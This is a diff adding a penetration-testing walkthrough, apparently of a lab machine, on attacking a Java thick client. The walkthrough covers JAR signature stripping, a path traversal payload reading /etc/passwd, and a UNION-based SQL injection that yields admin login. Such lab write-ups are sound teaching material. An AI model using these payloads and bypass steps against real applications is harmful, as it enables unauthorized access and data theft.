@@ -2529,6 +2529,231 @@ dnSpy restart-service_00000000001E0000-cleaned.bin
 
 ---
 
+# 🧠 Exploiting Web Vulnerabilities in Thick-Client Applications
+
+## 📌 Overview
+
+This walkthrough demonstrates the exploitation of a **Java-based thick client** (`fatty-client.jar`) that communicates with a backend server. The focus is on identifying misconfigurations, modifying the client, and exploiting vulnerabilities like **SQL Injection** and **Path Traversal** to gain administrative access.
+
+## 🔎 Reconnaissance
+
+### 📁 Files Found on FTP Server (Anonymous Access Enabled):
+
+* `fatty-client.jar`
+* `note.txt`
+* `note2.txt`
+* `note3.txt`
+
+### 📝 Findings from Notes:
+
+* Server port changed to `1337` (was `8000`)
+* Client still configured to use old port
+* Client runs on **Java 8**
+* Credentials found: `qtc : clarabibi`
+
+## 🚫 Initial Login Attempt
+
+* Launching `fatty-client.jar` and using credentials shows:
+
+  ```
+  Connection Error!
+  ```
+* **Suspected Issue**: Port mismatch (`8000` hardcoded)
+
+## 🕵️ Traffic Analysis via Wireshark
+
+### DNS Resolution:
+
+* Failing for:
+
+  * `server.fatty.htb`
+  * `server.fatty.htb.localdomain`
+
+### 🛠️ Fix via Hosts File:
+
+```bash
+echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
+```
+
+## 🔍 Identify Port Configuration in JAR
+
+### 🧵 Unpack the JAR:
+
+* Extract `fatty-client.jar`
+* Locate `beans.xml`:
+
+```xml
+<constructor-arg index="1" value = "8000"/>
+```
+
+### 🛠️ Modify Port:
+
+* Change to:
+
+```xml
+<constructor-arg index="1" value = "1337"/>
+```
+
+## 🔐 JAR Signature Bypass
+
+### Remove Integrity Checks:
+
+* Delete from `META-INF/`:
+
+  * `1.SF`
+  * `1.RSA`
+* Clean `MANIFEST.MF` of all SHA entries
+* Add a newline at EOF
+
+### 🔁 Rebuild the JAR:
+
+```bash
+jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
+```
+
+## ✅ Successful Login
+
+Using `qtc / clarabibi` now returns:
+
+```
+Login Successful!
+```
+
+## 📋 Application Access Review
+
+### User Role: `user`
+
+* **Limited access**
+* `ServerStatus` section greyed out
+
+### 📁 FileBrowser:
+
+* `/notes/security.txt`:
+
+  * Mentions a pentest is ongoing
+* `/mail/dave.txt`:
+
+  * All admin accounts removed
+  * Added login timeout to prevent time-based SQLi
+
+## 📁 Path Traversal
+
+### ❌ Attempt:
+
+```text
+../../../../../../etc/passwd
+```
+
+> ❌ Error: `/` character filtered
+
+### 🧠 Decompile & Analyze:
+
+* Decompile with **JD-GUI**
+* Locate:
+
+  * `Invoker.java`
+  * `ClientGuiTest.java`
+
+### ✅ Bypass via Source Modification:
+
+* Replace `configs` with `".."` to bypass folder restrictions
+* Recompile `ClientGuiTest.java`
+* Replace `.class` files in JAR
+* Rebuild JAR:
+
+```bash
+jar -cmf META-INF\MANIFEST.MF traverse.jar .
+```
+
+### 📁 Gain Directory Access:
+
+* Traverse to `configs/../`
+* Discovered files:
+
+  * `fatty-server.jar`
+  * `start.sh` (mentions Alpine + Docker)
+
+## 📥 Downloading Server-Side Files
+
+### 🔧 Modify `Invoker.java`:
+
+* Alter `open()` to **save file to disk**
+* Write binary content from server response
+
+### 🔁 Rebuild and Login:
+
+* Navigate to FileBrowser → Config
+* Enter: `fatty-server.jar`
+* Click `Open`
+* ✅ File saved to Desktop
+
+## 🛠️ Reverse Engineering `fatty-server.jar`
+
+### 🔍 Vulnerable Function:
+
+`FattyDbSession.class → checkLogin(User user)`
+
+```java
+rs = stmt.executeQuery("SELECT ... FROM users WHERE username='" + user.getUsername() + "'");
+```
+
+> 🔥 **SQL Injection** due to unsanitized `username`
+
+
+## 🔐 Password Processing Insight
+
+* Hash = `SHA256(username + password + "clarabibimakeseverythingsecure")`
+
+> Server-side checks hash of combined values for password validation.
+
+## 🧪 SQL Injection via `username` Field
+
+### 🧨 Injection Test:
+
+```sql
+' OR '1'='1
+```
+
+Fails due to hash mismatch, but confirms vulnerability in logs.
+
+
+## 📜 Logs Reveal Error
+
+### Modify GUI to List Logs:
+
+```java
+ClientGuiTest.this.currentFolder = "../logs";
+```
+
+* Read `error-log.txt` → confirms SQL exception syntax errors
+
+
+## 💉 Exploiting with UNION Injection
+
+### Bypass Password Validation:
+
+1. Modify `User.java`:
+
+   * Allow raw password (no hashing)
+
+```java
+public void setPassword(String password) {
+    this.password = password;
+}
+```
+
+2. Use crafted payload:
+
+   ```
+   Username: abc' UNION SELECT 1,'abc','a@b.com','abc','admin
+   Password: abc
+   ```
+
+> Login ✅ as `admin` with full privileges!
+
+
+---
+
 # ColdFusion - Discovery & Enumeration
 
 ## 🧩 Overview
